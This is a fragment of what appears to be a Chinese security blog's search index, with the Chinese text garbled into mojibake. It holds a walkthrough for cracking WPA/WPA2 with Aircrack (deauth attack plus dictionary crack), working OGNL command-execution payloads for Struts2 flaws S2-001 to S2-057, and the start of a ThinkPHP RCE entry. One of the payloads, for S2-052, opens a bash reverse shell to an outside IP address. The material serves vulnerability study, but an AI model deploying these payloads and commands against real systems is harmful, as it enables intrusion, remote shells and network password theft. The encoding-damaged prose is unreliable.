é¦–å…ˆå¯åŠ¨ç›‘å¬ï¼š sudo airmon-ng start wlan0 ç»“æœå¦‚å›¾ï¼š å›¾ 3 \" å›¾ 3 æ­¤æ—¶ ifconfig å¯ä»¥çœ‹åˆ° wlan0mon ç›‘å¬ç½‘å¡ï¼š å›¾ 4 \" å›¾ 4 éšåæ‰«ææ— çº¿ç½‘ç»œï¼š sudo airodump-ng wlan0mon ç»“æœå¦‚å›¾ï¼Œå¯ä»¥çœ‹åˆ° nova 4 ç½‘ç»œçš„ BSSID ä¸º D8:9B:3B:9E:AB:A9ã€‚ å›¾ 5 \" å›¾ 5 åˆ©ç”¨è¯¥ BSSID è¿‡æ»¤æ‰å…¶ä½™ç½‘ç»œæµé‡ï¼š sudo airodump-ng -c 11 --bssid D8:9B:3B:9E:AB:A9 -w psk wlan0mon ç»“æœå¦‚å›¾ï¼š å›¾ 6 \" å›¾ 6 ","date":"2020-10-18","objectID":"/aircrack-wpa/:1:0","tags":["Kali","ç½‘ç»œ"],"title":"çª¥é—´ä¼ºéš™ï¼šAircrack å¥—ä»¶ç ´è§£ WPA/WPA2 å¯†ç ","uri":"/aircrack-wpa/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"æ•è· WPA æ¡æ‰‹åŒ… æ­¤æ—¶æˆ‘ä»¬éœ€è¦æ•è·åˆ° WPA æ¡æ‰‹åŒ…ï¼Œå› æ­¤å¯ä»¥æ”»å‡»ä¸€ä¸ªå·²ç»è¿æ¥åˆ°è¯¥ç½‘ç»œçš„ä¸»æœºï¼ˆå³æˆ‘ä»¬çš„ç‰©ç†æœºï¼‰ï¼Œè®©å®ƒå¼ºåˆ¶æ‰çº¿å¹¶é‡è¿äº§ç”Ÿæ¡æ‰‹åŒ…ã€‚ é¦–å…ˆæŸ¥çœ‹è¢«å®³ä¸»æœº MAC åœ°å€ï¼š å›¾ 7 \" å›¾ 7 å¯ä»¥çœ‹åˆ° MAC åœ°å€ä¸º F4:8C:50:9F:E5:43ã€‚å®é™…ä¸Šï¼Œåœ¨å‰é¢ airodump-ng æ—¶çš„ç•Œé¢ä¸­ä¹Ÿå¯ä»¥ç›´æ¥çœ‹åˆ°è¿æ¥äº†è¯¥ç½‘ç»œçš„ä¸»æœº MAC åœ°å€ã€‚éšåå‘é€ DeAuth åŒ…ä½¿å…¶æ‰çº¿ï¼š sudo aireplay-ng -0 1 -a D8:9B:3B:9E:AB:A9 -c F4:8C:50:9F:E5:43 wlan0mon å‡ºç° WPA handshake å³æ•è·åˆ°äº†æ¡æ‰‹åŒ…ï¼Œå¯ä»¥åœæ­¢æ•è·äº†ã€‚ å›¾ 8 \" å›¾ 8 ","date":"2020-10-18","objectID":"/aircrack-wpa/:2:0","tags":["Kali","ç½‘ç»œ"],"title":"çª¥é—´ä¼ºéš™ï¼šAircrack å¥—ä»¶ç ´è§£ WPA/WPA2 å¯†ç ","uri":"/aircrack-wpa/"},{"categories":["å®‰å…¨å·¥å…·"],"content":"å£ä»¤ç ´è§£ æ­¤æ—¶åœ¨ç›®å½•ä¸‹ä¼šç”Ÿæˆ psk-01.cap ï¼Œæˆ‘ä»¬ä½¿ç”¨ aircrack-ng è¿›è¡Œå£ä»¤ç ´è§£ï¼š sudo aircrack-ng -w password.lst -b D8:9B:3B:9E:AB:A9 psk*.cap ä½¿ç”¨çš„å­—å…¸ä¸­åŒ…å«äº† merc123321 è¿™ä¸ªçœŸæ­£çš„å¯†ç ï¼š $ cat password.lst merc123 merc1234 merc123456 123merc 1234merc 123456merc merc123321 merc321123 æœ€åå³å¯æˆåŠŸç ´è§£ï¼š å›¾ 9 \" å›¾ 9 ","date":"2020-10-18","objectID":"/aircrack-wpa/:3:0","tags":["Kali","ç½‘ç»œ"],"title":"çª¥é—´ä¼ºéš™ï¼šAircrack å¥—ä»¶ç ´è§£ WPA/WPA2 å¯†ç ","uri":"/aircrack-wpa/"},{"categories":["Web å®‰å…¨"],"content":"åŒ…å« s2-001 / s2-003 / s2-005 / s2-007 / s2-008 / s2-009 / s2-012 / s2-013 / s2-014 / s2-015 / s2-016 / s2-045 / s2-046 / s2-048 / s2-052 / s2-053 / s2-057 ","date":"2020-08-04","objectID":"/struts2/:0:0","tags":["Java"],"title":"Struts2 æ¼æ´å­¦ä¹ ","uri":"/struts2/"},{"categories":["Web å®‰å…¨"],"content":"s2-001 å‚è€ƒ å½±å“ç‰ˆæœ¬ï¼š2.0.0 - 2.0.8 ç”¨æˆ·æäº¤è¡¨å•å¤±è´¥æ—¶ï¼Œæäº¤çš„æ•°æ®ä¼šè¢«ä½œä¸º OGNL è¡¨è¾¾å¼æ‰§è¡Œï¼Œé€ æˆä»£ç æ‰§è¡Œã€‚ è·å– tomcat è·¯å¾„ï¼š %{\"tomcatBinDir{\"+@java.lang.System@getProperty(\"user.dir\")+\"}\"} è·å–ç½‘ç«™è·¯å¾„ï¼š %{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()} æ‰§è¡Œå‘½ä»¤ï¼š %{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{\"id\"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()} å›¾ 1 \" å›¾ 1 ","date":"2020-08-04","objectID":"/struts2/:1:0","tags":["Java"],"title":"Struts2 æ¼æ´å­¦ä¹ ","uri":"/struts2/"},{"categories":["Web å®‰å…¨"],"content":"s2-003 | s2-005 å‚è€ƒ å½±å“ç‰ˆæœ¬ï¼š2.0.0 - 2.1.8.1 è¯·æ±‚çš„ GET å‚æ•°ä¼šé€šè¿‡ OGNL è¡¨è¾¾å¼è¢«è§£æä¸º Java è¯­å¥ã€‚åœ¨ s2-003 ä¸­å¯ä»¥ä½¿ç”¨ \\u0023 æ¥ç»•è¿‡å¯¹ # çš„è¿‡æ»¤ï¼Œè€Œåœ¨ä¿®å¤ä¸­å¼€å¯çš„å®‰å…¨é…ç½®å¯ä»¥è¢« OGNL è¡¨è¾¾å¼å…³é—­ï¼Œç„¶åå†åˆ©ç”¨ s2-003 çš„ payload æ”»å‡»ã€‚è¿™å°±æ˜¯ s2-005ã€‚ ç½‘ä¸Šå¤§éƒ¨åˆ† PoC éƒ½æ˜¯æ— å›æ˜¾çš„ï¼Œè¿™é‡Œæ”¾ä¸€ä¸ªå¸¦å›æ˜¾çš„ PoCï¼š /example/HelloWorld.action?('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)\u0026('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(bla)(bla)\u0026('\\u0023_memberAccess.allowStaticMethodAccess\\u003dtrue')(bla)(bla)\u0026('\\u0023mycmd\\u003d\\'id\\'')(bla)(bla)\u0026('\\u0023myret\\u003d@java.lang.Runtime@getRuntime().exec(\\u0023mycmd)')(bla)(bla)\u0026(A)(('\\u0023mydat\\u003dnew\\40java.io.DataInputStream(\\u0023myret.getInputStream())')(bla))\u0026(B)(('\\u0023myres\\u003dnew\\40byte[51020]')(bla))\u0026(C)(('\\u0023mydat.readFully(\\u0023myres)')(bla))\u0026(D)(('\\u0023mystr\\u003dnew\\40java.lang.String(\\u0023myres)')(bla))\u0026('\\u0023myout\\u003d@org.apache.struts2.ServletActionContext@getResponse()')(bla)(bla)\u0026(E)(('\\u0023myout.getWriter().println(\\u0023mystr)')(bla)) å›¾ 2 \" å›¾ 2 ","date":"2020-08-04","objectID":"/struts2/:2:0","tags":["Java"],"title":"Struts2 æ¼æ´å­¦ä¹ ","uri":"/struts2/"},{"categories":["Web å®‰å…¨"],"content":"s2-007 å‚è€ƒ å½±å“ç‰ˆæœ¬ï¼š2.0.0 - 2.2.3 é…ç½®éªŒè¯è§„åˆ™åï¼Œç±»å‹è½¬æ¢å‡ºé”™æ—¶è¿›è¡Œäº†é”™è¯¯çš„å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œä»è€Œå¯ä»¥æ‰§è¡Œ OGNL è¡¨è¾¾å¼ã€‚è¿™é‡Œçš„åŸç†å’Œ SQL æ³¨å…¥ç±»ä¼¼ã€‚ '+ (#_memberAccess[\"allowStaticMethodAccess\"]=true,#foo=new java.lang.Boolean(\"false\") ,#context[\"xwork.MethodAccessor.denyMethodExecution\"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + ' å›¾ 3 \" å›¾ 3 ","date":"2020-08-04","objectID":"/struts2/:3:0","tags":["Java"],"title":"Struts2 æ¼æ´å­¦ä¹ ","uri":"/struts2/"},{"categories":["Web å®‰å…¨"],"content":"s2-008 å‚è€ƒ å½±å“ç‰ˆæœ¬ï¼š2.1.0 - 2.3.1 æ¯”è¾ƒé¸¡è‚‹çš„æ¼æ´ï¼Œå¼€å¯ devMode åï¼ˆé»˜è®¤å…³é—­ï¼‰ç›´æ¥åˆ©ç”¨è°ƒè¯•æ¥å£æ‰§è¡Œ OGNL è¡¨è¾¾å¼ã€‚ debug=command\u0026expression=(%23_memberAccess.allowStaticMethodAccess=true,%23context[\"xwork.MethodAccessor.denyMethodExecution\"]=false,%23cmd=\"id\",%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[38],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo)) è¿™é‡Œéœ€è¦æ³¨æ„ï¼ŒPoC ä¸­ #res=new byte[n] çš„ n ä¸èƒ½è¶…è¿‡å‘½ä»¤æ‰§è¡Œç»“æœçš„é•¿åº¦ï¼Œå¦åˆ™å°±ä¼šç›´æ¥å›æ˜¾ nullã€‚ä¸Šé¢æ˜¯æ ¹æ® id ç»“æœçš„é•¿åº¦ç²—ç•¥é€‰å–çš„æ•°å­— 38 ã€‚ ","date":"2020-08-04","objectID":"/struts2/:4:0","tags":["Java"],"title":"Struts2 æ¼æ´å­¦ä¹ ","uri":"/struts2/"},{"categories":["Web å®‰å…¨"],"content":"s2-009 å‚è€ƒ å½±å“ç‰ˆæœ¬ï¼š2.1.0 - 2.3.1.1 åœ¨ s2-005 çš„ä¿®å¤ä¸­è¿‡æ»¤äº† \\ ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œç„¶è€Œå¯¹äºæ¥å—æŸä¸ªå‚æ•° example çš„æ¥å£æ¥è¯´ï¼Œexample å‚æ•°çš„å€¼ä¾ç„¶ä¼šè¢«å½“ä½œ OGNL è¡¨è¾¾å¼æ‰§è¡Œã€‚ç„¶åå°±å¯ä»¥é€šè¿‡ç±»ä¼¼ example=\u003cOGNL statement\u003e\u0026(example)('bla')=1 æ¥ç»•è¿‡è¿‡æ»¤ã€‚ age=4923\u0026name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27id%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(%23d),%23writer.close())(bla)\u0026z[(name)(%27bla%27)] ","date":"2020-08-04","objectID":"/struts2/:5:0","tags":["Java"],"title":"Struts2 æ¼æ´å­¦ä¹ ","uri":"/struts2/"},{"categories":["Web å®‰å…¨"],"content":"s2-012 å‚è€ƒ å½±å“ç‰ˆæœ¬ï¼š2.1.0 - 2.3.13 åœ¨ action é…ç½®ä¸­çš„ result ä¸­ä½¿ç”¨ redirect ç±»å‹æ—¶ï¼Œå¦‚æœä½¿ç”¨äº†å˜é‡ï¼Œå¦‚ ${param}ï¼Œé‚£ä¹ˆåœ¨é‡å®šå‘æ—¶ä¼šå¯¹ param è¿›è¡Œ OGNL è¡¨è¾¾å¼è§£æã€‚ å¯ä»¥ç›´æ¥ä½¿ç”¨ s2-001 çš„ PoCã€‚ ","date":"2020-08-04","objectID":"/struts2/:6:0","tags":["Java"],"title":"Struts2 æ¼æ´å­¦ä¹ ","uri":"/struts2/"},{"categories":["Web å®‰å…¨"],"content":"s2-013 | s2-014 å‚è€ƒ å½±å“ç‰ˆæœ¬ï¼š2.0.0 - 2.3.14.1 struts2 çš„ \u003cs:a\u003e å’Œ \u003cs:url\u003e éƒ½æœ‰ä¸€ä¸ª includeParams å±æ€§ï¼Œå¯ä»¥è®¾ç½®ä¸ºï¼š none - URL ä¸­ä¸åŒ…å«ä»»ä½•å‚æ•°ï¼ˆé»˜è®¤ï¼‰ get - ä»…åŒ…å« URL ä¸­çš„ GET å‚æ•° all - åœ¨ URL ä¸­åŒ…å« GET å’Œ POST å‚æ•°ï¼Œæ­¤æ—¶ GET å’Œ POST å‚æ•°éƒ½åœ¨ query string ä¸­ æœ€åä¸€ç§æƒ…å†µä¸‹è§£æå‚æ•°æ—¶ï¼Œä¼šå¯¼è‡´ OGNL è¡¨è¾¾å¼æ‰§è¡Œï¼Œé€ æˆä»£ç æ‰§è¡Œã€‚ å­˜åœ¨ä¸¤ç§ PoCï¼š ${(#_memberAccess[\"allowStaticMethodAccess\"]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())} ${#_memberAccess[\"allowStaticMethodAccess\"]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())} s2-013 çš„ä¿®å¤ä»…ä»…é™åˆ¶äº† ${(#exp)} æ ¼å¼çš„ PoC æ‰§è¡Œï¼Œç„¶è€Œ ${exp} æ ¼å¼åŒæ ·å¯ä»¥æ‰§è¡Œã€‚è¿™å¯¼è‡´äº† s2-014 çš„äº§ç”Ÿã€‚ ä¸Šé¢çš„ $ éƒ½å¯ä»¥æ¢æˆ %ã€‚ ","date":"2020-08-04","objectID":"/struts2/:7:0","tags":["Java"],"title":"Struts2 æ¼æ´å­¦ä¹ ","uri":"/struts2/"},{"categories":["Web å®‰å…¨"],"content":"s2-015 å‚è€ƒ å½±å“ç‰ˆæœ¬ï¼š2.0.0 - 2.3.14.2 åœ¨ action ä¸­é…ç½®äº† name=\"*\" ï¼Œä¸” result ä¸­å«æœ‰å˜é‡æ—¶ï¼Œå¦‚ {1}.jsp ï¼Œé‚£ä¹ˆ {} ä¸­çš„å†…å®¹ä¼šè¢«å½“ä½œ OGNL è¡¨è¾¾å¼è§£æã€‚é—æ†¾çš„æ˜¯è¿™ç§æƒ…å†µä¸‹æ— æ³•ä½¿ç”¨ \",/,\\ ç­‰ç‰¹æ®Šå­—ç¬¦ã€‚ æ­¤å¤–ï¼Œ2.3.14.2 ç‰ˆæœ¬å¼€å§‹æ— æ³•ä½¿ç”¨è¿‡å»å¸¸ç”¨çš„ #_memberAccess['allowStaticMethodAccess']=true æ¥å¼€å¯é™æ€æ–¹æ³•è°ƒç”¨ï¼Œæ­¤æ—¶å¯ä»¥é€šè¿‡åå°„æœºåˆ¶æ¥å¼€å¯ã€‚ %{#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#q}.action å›¾ 4 \" å›¾ 4 å›¾ 5 \" å›¾ 5 ","date":"2020-08-04","objectID":"/struts2/:8:0","tags":["Java"],"title":"Struts2 æ¼æ´å­¦ä¹ ","uri":"/struts2/"},{"categories":["Web å®‰å…¨"],"content":"s2-016 å‚è€ƒ å½±å“ç‰ˆæœ¬ï¼š2.0.0 - 2.3.15 å¤„ç†é‡å®šå‘å‰ç¼€ action: / redirect: / redirectAction: æ—¶å¯¹åé¢çš„ URL è¿›è¡Œ OGNL è§£æï¼Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚ index.action?redirect:${#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false,#f=#_memberAccess.getClass().getDeclaredField(\"allowStaticMethodAccess\"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(\"uname -a\").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()} ","date":"2020-08-04","objectID":"/struts2/:9:0","tags":["Java"],"title":"Struts2 æ¼æ´å­¦ä¹ ","uri":"/struts2/"},{"categories":["Web å®‰å…¨"],"content":"s2-045 å‚è€ƒ å½±å“ç‰ˆæœ¬ï¼š2.3.5 - 2.3.31, 2.5 - 2.5.10 å‘ä¸Šä¼ æ•°æ®åŒ…æ—¶ï¼Œä¿®æ”¹ Content-Type å¤´ä½¿å¾—è§£æå¼‚å¸¸ï¼Œä»è€Œå¯¼è‡´æŠ¥é”™ä¿¡æ¯è¢«å½“ä½œ OGNL è¡¨è¾¾å¼æ‰§è¡Œã€‚ å®é™…ä¸Šï¼Œå¹¶ä¸éœ€è¦ä½¿ç”¨ POST æ–¹æ³•ï¼Œä¹Ÿä¸éœ€è¦ç½‘ç«™å­˜åœ¨ä¸Šä¼ æ–‡ä»¶åŠŸèƒ½ï¼Œåªéœ€è¦ Content-Type ä¸­åŒ…å« multipart/form-data å³å¯ã€‚å¦‚ï¼š Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('result',3048+9572)}.multipart/form-data å›¾ 6 \" å›¾ 6 Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','ipconfig'}:{'/bin/bash','-c','id'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.multipart/form-data å›¾ 7 \" å›¾ 7 ","date":"2020-08-04","objectID":"/struts2/:10:0","tags":["Java"],"title":"Struts2 æ¼æ´å­¦ä¹ ","uri":"/struts2/"},{"categories":["Web å®‰å…¨"],"content":"s2-046 å‚è€ƒ å½±å“ç‰ˆæœ¬ï¼š2.3.5 - 2.3.31, 2.5 - 2.5.10 ç±»ä¼¼ s2-045ï¼Œè¿™æ¬¡ä¿®æ”¹çš„æ˜¯ Content-Disposition çš„ filename å­—æ®µã€‚æœ€åéœ€è¦é€šè¿‡ \\x00b æ¥æˆªæ–­ payloadã€‚ %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','ipconfig'}:{'/bin/bash','-c','id'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\\x00b æ³¨æ„ä¸Šé¢ \\x00 å¤„åœ¨ burp é‡Œéœ€è¦é€šè¿‡ Hex ç•Œé¢ä¿®æ”¹ä¸º 00 å­—èŠ‚ï¼Œå› æ­¤ç½‘ä¸Š PoC å¤§å¤šä½¿ç”¨ python è„šæœ¬ç¼–å†™è€Œä¸æ˜¯ burp é‡æ”¾ã€‚ å›¾ 8 \" å›¾ 8 ","date":"2020-08-04","objectID":"/struts2/:11:0","tags":["Java"],"title":"Struts2 æ¼æ´å­¦ä¹ ","uri":"/struts2/"},{"categories":["Web å®‰å…¨"],"content":"s2-048 å‚è€ƒ å½±å“ç‰ˆæœ¬ï¼š2.0.0 - 2.3.32 struts1 æ’ä»¶ä¸­å°†ç”¨æˆ·è¾“å…¥çš„ message ä½œä¸º OGNL è¡¨è¾¾å¼æ‰§è¡Œï¼Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚è¿™é‡Œå¯ä»¥ç›´æ¥ä½¿ç”¨ s2-045 çš„ PoCã€‚ ","date":"2020-08-04","objectID":"/struts2/:12:0","tags":["Java"],"title":"Struts2 æ¼æ´å­¦ä¹ ","uri":"/struts2/"},{"categories":["Web å®‰å…¨"],"content":"s2-052 å‚è€ƒ å½±å“ç‰ˆæœ¬ï¼š2.1.2 - 2.3.33, 2.5 - 2.5.12 REST æ’ä»¶ç”¨ XStream å¤„ç† application/xml çš„æ•°æ®åŒ…ï¼Œåœ¨ååºåˆ—åŒ– XML æ—¶å¯ä»¥å¯¼è‡´ä»£ç æ‰§è¡Œã€‚ æš‚æ—¶æ²¡æœ‰å‘ç°å¸¦å›æ˜¾çš„ PoCï¼Œå¯ä»¥åå¼¹ shell æ¥éªŒè¯ï¼š \u003cmap\u003e \u003centry\u003e \u003cjdk.nashorn.internal.objects.NativeString\u003e \u003cflags\u003e0\u003c/flags\u003e \u003cvalue class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"\u003e \u003cdataHandler\u003e \u003cdataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"\u003e \u003cis class=\"javax.crypto.CipherInputStream\"\u003e \u003ccipher class=\"javax.crypto.NullCipher\"\u003e \u003cinitialized\u003efalse\u003c/initialized\u003e \u003copmode\u003e0\u003c/opmode\u003e \u003cserviceIterator class=\"javax.imageio.spi.FilterIterator\"\u003e \u003citer class=\"javax.imageio.spi.FilterIterator\"\u003e \u003citer class=\"java.util.Collections$EmptyIterator\"/\u003e \u003cnext class=\"java.lang.ProcessBuilder\"\u003e \u003ccommand\u003e \u003cstring\u003ebash\u003c/string\u003e \u003cstring\u003e-c\u003c/string\u003e \u003cstring\u003ebash -i \u003e\u0026amp; /dev/tcp/174.2.198.151/8080 0\u003e\u0026amp;1\u003c/string\u003e \u003c/command\u003e \u003credirectErrorStream\u003efalse\u003c/redirectErrorStream\u003e \u003c/next\u003e \u003c/iter\u003e \u003cfilter class=\"javax.imageio.ImageIO$ContainsFilter\"\u003e \u003cmethod\u003e \u003cclass\u003ejava.lang.ProcessBuilder\u003c/class\u003e \u003cname\u003estart\u003c/name\u003e \u003cparameter-types/\u003e \u003c/method\u003e \u003cname\u003efoo\u003c/name\u003e \u003c/filter\u003e \u003cnext class=\"string\"\u003efoo\u003c/next\u003e \u003c/serviceIterator\u003e \u003clock/\u003e \u003c/cipher\u003e \u003cinput class=\"java.lang.ProcessBuilder$NullInputStream\"/\u003e \u003cibuffer\u003e\u003c/ibuffer\u003e \u003cdone\u003efalse\u003c/done\u003e \u003costart\u003e0\u003c/ostart\u003e \u003cofinish\u003e0\u003c/ofinish\u003e \u003cclosed\u003efalse\u003c/closed\u003e \u003c/is\u003e \u003cconsumed\u003efalse\u003c/consumed\u003e \u003c/dataSource\u003e \u003ctransferFlavors/\u003e \u003c/dataHandler\u003e \u003cdataLen\u003e0\u003c/dataLen\u003e \u003c/value\u003e \u003c/jdk.nashorn.internal.objects.NativeString\u003e \u003cjdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/\u003e \u003c/entry\u003e \u003centry\u003e \u003cjdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/\u003e \u003cjdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/\u003e \u003c/entry\u003e \u003c/map\u003e å›¾ 9 \" å›¾ 9 å›¾ 10 \" å›¾ 10 ","date":"2020-08-04","objectID":"/struts2/:13:0","tags":["Java"],"title":"Struts2 æ¼æ´å­¦ä¹ ","uri":"/struts2/"},{"categories":["Web å®‰å…¨"],"content":"s2-053 å‚è€ƒ å½±å“ç‰ˆæœ¬ï¼š2.0.1 - 2.3.33ï¼Œ 2.5 - 2.5.10 ä½¿ç”¨ Freemarker æ¨¡æ¿å¼•æ“æ—¶ï¼Œå¦‚æœå­˜åœ¨è¿™æ ·çš„ä»£ç ï¼š \u003c@s.hidden name=\"redirectUri\"value=redirectUri /\u003e æˆ–è€…ï¼š \u003c@s.hidden name=\"redirectUri\"value=\"${redirectUri}\"/\u003e é‚£ä¹ˆæ­¤æ—¶ï¼Œç”¨æˆ·è¾“å…¥ä¼šå…ˆè¢« Freemarker è§£æï¼Œéšåè¢«å½“ä½œ OGNL è¡¨è¾¾å¼è§£æï¼Œé€ æˆä»£ç æ‰§è¡Œã€‚ %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','ipconfig'}:{'/bin/bash','-c','id'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))} æ³¨æ„æœ€åå¿…é¡»æ·»åŠ æ¢è¡Œç¬¦ï¼ˆ\\x0aï¼‰ã€‚ å›¾ 11 \" å›¾ 11 ","date":"2020-08-04","objectID":"/struts2/:14:0","tags":["Java"],"title":"Struts2 æ¼æ´å­¦ä¹ ","uri":"/struts2/"},{"categories":["Web å®‰å…¨"],"content":"s2-057 å‚è€ƒ å½±å“ç‰ˆæœ¬ï¼š2.3 - 2.3.34ï¼Œ 2.5 - 2.5.16 å¦‚æœ alwaysSelectFullNamespace è®¾ç½®ä¸º true ä¸” action ä¸­æœªè®¾ç½® namespace æˆ–ç›´æ¥ä½¿ç”¨ * ï¼Œé‚£ä¹ˆæ­¤æ—¶çš„ namespace ç”±ç”¨æˆ·æ§åˆ¶ï¼Œå¹¶ä½œä¸º OGNL è¡¨è¾¾å¼è§£æã€‚ ${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))} å›¾ 12 \" å›¾ 12 ","date":"2020-08-04","objectID":"/struts2/:15:0","tags":["Java"],"title":"Struts2 æ¼æ´å­¦ä¹ ","uri":"/struts2/"},{"categories":["Web å®‰å…¨"],"content":"åŒ…å« ThinkPHP 5.x RCE / ThinkPHP 5.0.23 RCE / ThinkPHP 2.x RCE / ThinkPHP 5.x SQL æ³¨å…¥å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ² / phpMyAdmin 4.8.1 è¿œç¨‹æ–‡ä»¶åŒ…å« / phpMyAdmin 4.0.x-4.6.2 è®¤è¯ç”¨æˆ· RCE / phpMyAdmin 2.x setup.php ååºåˆ—åŒ– ","date":"2020-07-29","objectID":"/think-php-myadmin/:0:0","tags":["PHP"],"title":"ThinkPHP \u0026 phpMyAdmin æ¼æ´å­¦ä¹ ","uri":"/think-php-myadmin/"},{"categories":["Web å®‰å…¨"],"content":"ThinkPHP 5.x RCE å‚è€ƒ Controller ä¸­æ²¡æœ‰è¿‡æ»¤æ‰ \\ï¼Œä½†å‘½åç©ºé—´æ°å¥½éœ€è¦ç”¨åˆ° \\ï¼Œå› æ­¤å¯ä»¥è°ƒç”¨ä»»æ„ç±»çš„æ–¹æ³•è¾¾åˆ° RCEã€‚ /index.php?s=/index/\\think\\app/invokefunction\u0026function=call_user_func_array\u0026vars[0]=printf\u0026vars[1][]=b769a6983b42d565e79bb4f3f534623453f301d39784e57804a649a67ea05327 å›¾ 1 \" å›¾ 1 ","date":"2020-07-29","objectID":"/think-php-myadmin/:1:0","tags":["PHP"],"title":"ThinkPHP \u0026 phpMyAdmin æ¼æ´å­¦ä¹ ","uri":"/think-php-myadmin/"},{"categories":["Web å®‰å…¨"],"content":"ThinkPHP 5.0.23 RCE å‚è€ƒ 